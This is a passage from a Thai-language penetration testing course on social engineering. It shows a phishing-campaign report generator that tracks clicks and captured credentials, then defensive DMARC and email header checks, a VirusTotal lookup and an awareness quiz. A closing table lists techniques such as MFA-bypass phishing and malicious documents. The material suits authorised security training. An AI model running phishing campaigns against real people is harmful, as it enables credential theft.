    <li>Regular phishing simulations (quarterly)</li>
</ol>

</body></html>"""
        
        with open('phishing_report.html', 'w') as f:
            f.write(report)
        
        print("[+] Report generated: phishing_report.html")
        return report

# Example usage
report = PhishingReport('Q4 2024 Phishing Assessment', 'Acme Corporation')

# Simulate campaign data
import random
targets = [f'user{i}@company.com' for i in range(100)]

for email in targets:
    report.add_event('sent', email)
    if random.random() < 0.45:  # 45% opened
        report.add_event('opened', email)
        if random.random() < 0.35:  # 35% of opened clicked
            report.add_event('clicked', email)
            if random.random() < 0.60:  # 60% of clicked submitted
                report.add_event('submitted', email, details={'password': 'captured'})
    if random.random() < 0.05:  # 5% reported
        report.add_event('reported', email)

stats = report.calculate_stats()
print(f"Campaign Statistics:")
print(json.dumps(stats, indent=2))
report.generate_html_report()
```

---

## ขั้นตอนที่ 180: Anti-Phishing Defense

### 180.1 Email Security Controls

```bash
# การป้องกัน Phishing ด้าน Defender

# 1. DMARC Analysis
# ตรวจสอบ DMARC policy
nslookup -type=txt _dmarc.domain.com
dig TXT _dmarc.domain.com

# DMARC record example:
# v=DMARC1; p=quarantine; rua=mailto:dmarc@company.com; ruf=mailto:dmarc@company.com;

# 2. Header Analysis ในแต่ละเมล
python3 << 'EOF'
import email
import email.utils
import re

EMAIL_FILE = 'suspicious_email.eml'

with open(EMAIL_FILE, 'r', errors='ignore') as f:
    raw = f.read()

msg = email.message_from_string(raw)

print("=== EMAIL HEADER ANALYSIS ===")
print(f"From: {msg.get('From')}")
print(f"Reply-To: {msg.get('Reply-To', 'Not set')}")
print(f"Return-Path: {msg.get('Return-Path', 'Not set')}")
print(f"Subject: {msg.get('Subject')}")
print(f"Date: {msg.get('Date')}")

# Extract Received headers
print("\nEmail Path:")
for header in msg.get_all('Received', []):
    print(f"  {header[:100]}")

# Check authentication results
auth = msg.get('Authentication-Results', '')
print(f"\nAuthentication: {auth}")

# Check SPF/DKIM/DMARC
if 'spf=pass' in auth.lower():
    print("  [+] SPF: PASS")
elif 'spf=fail' in auth.lower():
    print("  [!] SPF: FAIL - possible spoofing")

if 'dkim=pass' in auth.lower():
    print("  [+] DKIM: PASS")
elif 'dkim=fail' in auth.lower():
    print("  [!] DKIM: FAIL - message tampered")

if 'dmarc=pass' in auth.lower():
    print("  [+] DMARC: PASS")
elif 'dmarc=fail' in auth.lower():
    print("  [!] DMARC: FAIL - spoofed domain")

# Extract and check URLs
urls = re.findall(r'https?://[^\s"<>]+', raw)
print(f"\nURLs found: {len(urls)}")
for url in urls[:10]:
    print(f"  {url}")
EOF

# 3. PhishTool และ VirusTotal
# API check for phishing URLs
python3 << 'EOF'
import requests

VT_API_KEY = "YOUR_VT_API_KEY"

def check_url_vt(url):
    headers = {"x-apikey": VT_API_KEY}
    
    # Submit URL
    response = requests.post(
        "https://www.virustotal.com/api/v3/urls",
        headers=headers,
        data={"url": url}
    )
    
    url_id = response.json()["data"]["id"]
    
    # Get analysis
    analysis = requests.get(
        f"https://www.virustotal.com/api/v3/analyses/{url_id}",
        headers=headers
    )
    
    stats = analysis.json()["data"]["attributes"]["stats"]
    print(f"URL: {url}")
    print(f"  Malicious: {stats.get('malicious', 0)}")
    print(f"  Suspicious: {stats.get('suspicious', 0)}")
    print(f"  Harmless: {stats.get('harmless', 0)}")

check_url_vt("https://example-suspicious.com/login")
EOF
```

### 180.2 Security Awareness Training

```python
#!/usr/bin/env python3
# awareness_quiz.py - Phishing Awareness Training Quiz

QUIZ_QUESTIONS = [
    {
        'question': 'อีเมลต่อไปนี้มีสัญญาณใดที่น่าสงสัยของ Phishing?',
        'email_header': {
            'From': 'IT Support <support@micro-soft.com>',
            'Subject': 'URGENT: Your password expires in 24 hours!',
            'Reply-To': 'data.collection@gmail.com'
        },
        'options': [
            'A. ผู้ส่งใช้ email address ที่เป็น @micro-soft.com (ไม่ใช่ @microsoft.com)',
            'B. หัวข้อสร้างความเร่งด่วน',
            'C. Reply-To ไปยัง Gmail',
            'D. ถูกทุกข้อ'
        ],
        'answer': 'D',
        'explanation': """
        สัญญาณที่น่าสงสัย:
        1. Domain ลอก (micro-soft.com แทน microsoft.com)
        2. ความเร่งด่วน (password หมดอายุ 24 ชั่วโมง)
        3. Reply-To ต่างจาก From address
        วิธีรับมือ: ไม่คลิกลิงก์ - ตรวจสอบ domain โดยตรง - แจ้ง IT
        """
    },
    {
        'question': 'ถ้าได้รับเพลงโทรสัง เป็นฝ่าย IT บอกว่าต้องการ Password เพื่อแก้ไขปัญหาด่วน ควรทำอย่างไร?',
        'options': [
            'A. บอกไปทันที เพราะเป็นเรื่องด่วน',
            'B. บอกเฉพาะ username ไม่บอก password',
            'C. วางสายแล้วโทรกลับหา IT เพื่อยืนยันตัวตน (ใช้เบอร์ที่รู้จัก)',
            'D. บอก password ในสายสนทนา WhatsApp แทน'
        ],
        'answer': 'C',
        'explanation': """
        IT จริงไม่เคยขอ password ผ่านโทรศัพท์
        วิธีที่ถูกต้อง: วางสาย เปิดเบอร์โทรศัพท์ โทรไปหา IT Helpdesk
        โดยใช้เบอร์โทรที่รู้จัก ไม่ใช้เบอร์โทรจากคนโทรหา
        """
    }
]

def run_quiz():
    score = 0
    total = len(QUIZ_QUESTIONS)
    
    print("=== Phishing Awareness Quiz ===")
    print(f"Total questions: {total}\n")
    
    for i, q in enumerate(QUIZ_QUESTIONS, 1):
        print(f"Q{i}: {q['question']}")
        
        if 'email_header' in q:
            print("Email Headers:")
            for k, v in q['email_header'].items():
                print(f"  {k}: {v}")
        
        print()
        for opt in q['options']:
            print(f"  {opt}")
        
        answer = input("\nคำตอบ (A/B/C/D): ").upper().strip()
        
        if answer == q['answer']:
            print("\u2705 ถูกต้อง!")
            score += 1
        else:
            print(f"\u274c ไม่ถูก - คำตอบที่ถูกคือ {q['answer']}")
        
        print(f"\u2139️  {q['explanation']}")
        print("-" * 60)
    
    print(f"\nคะแนน: {score}/{total} ({score/total*100:.0f}%)")
    
    if score == total:
        print("เยี่ยม! เข้าใจ Phishing แล้วดี")
    elif score >= total * 0.7:
        print("ผ่าน! แต่ยังต้องเรียนรู้เพิ่มเติม")
    else:
        print("ต้องฝึกอบรมเพิ่มเติม - คุณมีความเสี่ยงต่อการโจมตีผ่าน Phishing")

if __name__ == '__main__':
    run_quiz()
```

---

## สรุป Part 18

| ขั้นตอน | หัวข้อ | เครื่องมือ/เทคนิค |
|---------|--------|------------------|
| 171 | SE Fundamentals | OSINT, hunter.io, email verification |
| 172 | GoPhish | Campaign setup, Python API |
| 173 | Evilginx2 | MFA bypass, custom phishlets |
| 174 | SET | Credential harvester, website cloning |
| 175 | Vishing | Caller ID spoofing, script templates |
| 176 | Spear Phishing | Email infrastructure, DKIM/SPF |
| 177 | Malicious Docs | VBA macro, DDE, PDF attacks |
| 178 | Physical Attacks | USB drop, badge cloning, tailgating |
| 179 | Campaign Reporting | Stats, HTML report generation |
| 180 | Anti-Phishing | DMARC, email analysis, awareness quiz |

---
*Part 18 ครอบคลุม Steps 171-180 | สำหรับ Authorized Security Assessments เท่านั้น*
